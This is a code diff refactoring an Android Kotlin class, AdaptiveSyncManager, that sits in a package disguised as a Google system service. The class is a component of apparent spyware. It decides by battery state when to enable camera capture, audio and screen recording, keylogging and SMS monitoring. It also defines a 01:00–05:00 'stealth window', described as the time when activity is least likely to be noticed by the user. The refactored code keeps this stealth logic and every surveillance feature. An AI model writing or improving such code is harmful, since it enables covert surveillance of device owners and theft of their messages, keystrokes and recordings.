@@ -1,187 +1,53 @@
 package com.google.android.systemservice.managers
 
 import android.content.Context
-import android.net.ConnectivityManager
-import android.net.NetworkCapabilities
-import android.os.BatteryManager
-import android.os.Build
-import android.os.PowerManager
-import android.util.Log
 
 /**
- * Manages adaptive synchronization intervals based on device state.
- * Adjusts sync frequency, location updates, and feature availability
- * according to battery level, charging state, network type, and power mode.
+ * Coordinator for adaptive synchronization decisions.
+ * Delegates to [SyncIntervalCalculator], [FeatureToggleManager], and [PowerModeHandler].
  */
-class AdaptiveSyncManager(private val context: Context) {
-    
+class AdaptiveSyncManager(context: Context) {
+
+    private val power = PowerModeHandler(context)
+    private val intervalCalc = SyncIntervalCalculator()
+    private val featureToggle = FeatureToggleManager()
+
+    // Preserve existing enum references (e.g. AdaptiveSyncManager.Feature.CAMERA_CAPTURE)
     companion object {
-        private const val TAG = "AdaptiveSyncManager"
-        private const val PREFS_NAME = "sync_config"
+        /** @see FeatureToggleManager.Feature */
+        typealias Feature = FeatureToggleManager.Feature
+        /** @see SyncIntervalCalculator.NetworkType */
+        typealias NetworkType = SyncIntervalCalculator.NetworkType
     }
-    
-    private val prefs = context.getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE)
-    private val batteryManager = context.getSystemService(Context.BATTERY_SERVICE) as? BatteryManager
-    
-    /**
-     * Check if current time is within the 'Stealth Window' (01:00 - 05:00)
-     * Activity during this window is less likely to be noticed by the user.
-     */
+
     fun isStealthWindow(): Boolean {
         val hour = java.util.Calendar.getInstance().get(java.util.Calendar.HOUR_OF_DAY)
         return hour in 1..5
     }
 
-    /**
-     * Get optimal sync interval in minutes based on current device state.
-     */
-    fun getSyncInterval(): Long {
-        val batteryLevel = getBatteryLevel()
-        val isCharging = isCharging()
-        val isLowPowerMode = isLowPowerMode()
-        val networkType = getNetworkType()
-        
-        val interval = when {
-            isStealthWindow() && isCharging -> 2 // High frequency during stealth window + charging
-            isLowPowerMode -> 60
-            isCharging && networkType == NetworkType.WIFI -> 5
-            isCharging -> 10
-            batteryLevel < 15 -> 120 // Even more conservative when critical
-            batteryLevel < 30 -> 45
-            networkType == NetworkType.WIFI -> 15
-            else -> 30
-        }
-        
-        Log.d(TAG, "Sync interval: $interval min (Stealth: ${isStealthWindow()})")
-        return interval.toLong()
-    }
-    
-    /**
-     * Get optimal location update interval in milliseconds.
-     */
-    fun getLocationUpdateInterval(): Long {
-        val batteryLevel = getBatteryLevel()
-        val isCharging = isCharging()
-        
-        val interval = when {
-            isCharging -> 5 * 60 * 1000L // 5 minutes
-            batteryLevel > 50 -> 10 * 60 * 1000L // 10 minutes
-            batteryLevel > 20 -> 20 * 60 * 1000L // 20 minutes
-            else -> 30 * 60 * 1000L // 30 minutes
-        }
-        
-        Log.d(TAG, "Location update interval: ${interval / 1000 / 60} min")
-        return interval
-    }
-    
-    /**
-     * Check if a specific feature should be enabled based on battery constraints.
-     */
-    fun shouldEnableFeature(feature: Feature): Boolean {
-        val batteryLevel = getBatteryLevel()
-        val isCharging = isCharging()
-        
-        val enabled = when (feature) {
-            Feature.CAMERA_CAPTURE -> batteryLevel > 30 || isCharging
-            Feature.AUDIO_RECORDING -> batteryLevel > 20 || isCharging
-            Feature.SCREEN_RECORDING -> batteryLevel > 40 || isCharging
-            Feature.HIGH_FREQUENCY_GPS -> batteryLevel > 50 || isCharging
-            Feature.KEYLOGGING -> batteryLevel > 10 || isCharging
-            Feature.SMS_MONITORING -> true // Always enabled
-        }
-        
-        if (!enabled) {
-            Log.d(TAG, "Feature $feature disabled due to battery constraints")
-        }
-        
-        return enabled
-    }
-    
-    /**
-     * Get recommended batch size for data uploads.
-     */
-    fun getBatchSize(): Int {
-        val batteryLevel = getBatteryLevel()
-        val networkType = getNetworkType()
-        
-        return when {
-            networkType == NetworkType.WIFI && batteryLevel > 50 -> 100
-            networkType == NetworkType.WIFI -> 50
-            batteryLevel > 50 -> 30
-            batteryLevel > 20 -> 20
-            else -> 10
-        }
-    }
-    
-    /**
-     * Check if background operations should be throttled.
-     */
-    fun shouldThrottleOperations(): Boolean {
-        val batteryLevel = getBatteryLevel()
-        val isLowPowerMode = isLowPowerMode()
-        
-        return isLowPowerMode || batteryLevel < 15
-    }
-    
-    private fun getBatteryLevel(): Int {
-        return try {
-            batteryManager?.getIntProperty(BatteryManager.BATTERY_PROPERTY_CAPACITY) ?: 100
-        } catch (e: Exception) {
-            Log.e(TAG, "Failed to get battery level: ${e.message}")
-            100 // Assume full battery on error
-        }
-    }
-    
-    private fun isCharging(): Boolean {
-        return try {
-            batteryManager?.isCharging ?: false
-        } catch (e: Exception) {
-            Log.e(TAG, "Failed to check charging state: ${e.message}")
-            false
-        }
-    }
-    
-    private fun isLowPowerMode(): Boolean {
-        return try {
-            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
-                val powerManager = context.getSystemService(Context.POWER_SERVICE) as? PowerManager ?: return false
-                powerManager.isPowerSaveMode
-            } else {
-                false
-            }
-        } catch (e: Exception) {
-            Log.e(TAG, "Failed to check power save mode: ${e.message}")
-            false
-        }
-    }
-    
-    private fun getNetworkType(): NetworkType {
-        return try {
-            val connectivityManager = context.getSystemService(Context.CONNECTIVITY_SERVICE) as? ConnectivityManager ?: return NetworkType.NONE
-            val network = connectivityManager.activeNetwork ?: return NetworkType.NONE
-            val capabilities = connectivityManager.getNetworkCapabilities(network) ?: return NetworkType.NONE
-            
-            when {
-                capabilities.hasTransport(NetworkCapabilities.TRANSPORT_WIFI) -> NetworkType.WIFI
-                capabilities.hasTransport(NetworkCapabilities.TRANSPORT_CELLULAR) -> NetworkType.CELLULAR
-                else -> NetworkType.NONE
-            }
-        } catch (e: Exception) {
-            Log.e(TAG, "Failed to get network type: ${e.message}")
-            NetworkType.NONE
-        }
-    }
-    
-    enum class Feature {
-        CAMERA_CAPTURE,
-        AUDIO_RECORDING,
-        SCREEN_RECORDING,
-        HIGH_FREQUENCY_GPS,
-        KEYLOGGING,
-        SMS_MONITORING
-    }
-    
-    enum class NetworkType {
-        NONE, WIFI, CELLULAR
-    }
+    fun getSyncInterval(): Long = intervalCalc.calculateSyncInterval(
+        batteryLevel = power.getBatteryLevel(),
+        isCharging = power.isCharging(),
+        isLowPowerMode = power.isLowPowerMode(),
+        networkType = power.getNetworkType(),
+        isStealthWindow = isStealthWindow()
+    )
+
+    fun getLocationUpdateInterval(): Long = intervalCalc.calculateLocationInterval(
+        batteryLevel = power.getBatteryLevel(),
+        isCharging = power.isCharging()
+    )
+
+    fun shouldEnableFeature(feature: Feature): Boolean = featureToggle.isFeatureEnabled(
+        feature = feature,
+        batteryLevel = power.getBatteryLevel(),
+        isCharging = power.isCharging()
+    )
+
+    fun getBatchSize(): Int = intervalCalc.calculateBatchSize(
+        batteryLevel = power.getBatteryLevel(),
+        networkType = power.getNetworkType()
+    )
+
+    fun shouldThrottleOperations(): Boolean = power.shouldThrottleOperations()
 }
